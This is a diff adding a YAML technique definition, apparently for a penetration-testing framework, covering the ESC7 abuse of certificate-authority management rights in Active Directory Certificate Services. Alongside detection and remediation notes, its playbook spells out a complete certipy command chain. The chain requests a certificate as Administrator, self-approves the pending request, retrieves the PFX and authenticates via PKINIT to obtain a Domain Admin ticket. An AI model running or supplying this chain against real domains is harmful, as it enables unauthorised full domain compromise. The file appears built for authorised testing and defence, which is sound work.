@@ -1,0 +1,69 @@
+# ESC7 — ADCS CA officer/manager rights → approve pending requests
+#
+# A compromised principal holds the "ManageCA" or
+# "ManageCertificates" right on the Enterprise CA. With
+# ManageCertificates, the attacker approves their own pending
+# certificate request (bypassing the CA's manager-approval
+# requirement); with ManageCA, they can add themselves as a
+# CA officer or modify CA config directly. From an approved
+# cert with client-auth + operator-supplied SAN → PKINIT as
+# any principal.
+#
+# Detection: `certipy find -vulnerable` flags "ESC7".
+# Fix: remove ManageCA / ManageCertificates rights from the
+# compromised principal; restrict to named CA administrators.
+technique: T1649
+name: ESC7 — ADCS CA ManageCertificates/ManageCA rights abuse
+tactic: [privilege-escalation, defense-evasion]
+platform: [windows]
+key: 'adcs:esc7'
+family: adcs
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC7 || echo "no ADCS CA officer path flagged ESC7 — see playbook"
+verify:
+  success: "ESC7"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc7
+  evidence: "principal {{principal}} holds Manage* on CA {{ca}}"
+  description: >
+    A compromised principal has the CA's ManageCertificates
+    or ManageCA rights. With ManageCertificates they can
+    approve pending manager-approved requests (bypassing the
+    approval gate); with ManageCA they can add themselves as
+    a CA officer, enable ESC6-shaped flags, or grant
+    themselves ManageCertificates. From an approved cert +
+    template that lets a SAN through → PKINIT as any
+    principal → DA.
+  remediation: >
+    Remove ManageCA / ManageCertificates from the compromised
+    principal via `certutil -setreg CA\Security` or the ADCS
+    console. Restrict CA officer rights to named CA
+    administrators only. Audit the CA issued-cert log for
+    unexpected approvals; audit CA config for changes
+    (EditFlags, template additions) since the compromise
+    date.
+  refs: [T1649, ESC7, certipy]
+playbook:
+  summary: >
+    ManageCertificates → approve own pending request → PKINIT
+    as any principal. Or ManageCA → grant self more rights,
+    enable ESC6, etc.
+  place: 'attacker-side (certipy ca / certipy req)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for ESC7 + the principal's specific right"
+    - "request a cert on a manager-approved template with any SAN: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<template>' -upn 'Administrator@corp.local'` — cert lands in the pending queue"
+    - "approve own request (ManageCertificates): `certipy ca -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -issue-request <request-id>` — cert becomes issued"
+    - "retrieve: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -retrieve <request-id>` — writes administrator.pfx"
+    - "PKINIT: `certipy auth -pfx administrator.pfx -dc-ip <dc>` — DA TGT"
+    - "CLEANUP: revoke the issued cert via `certipy ca -revoke <serial>`"
+  restore: "certipy ca -revoke <serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'"
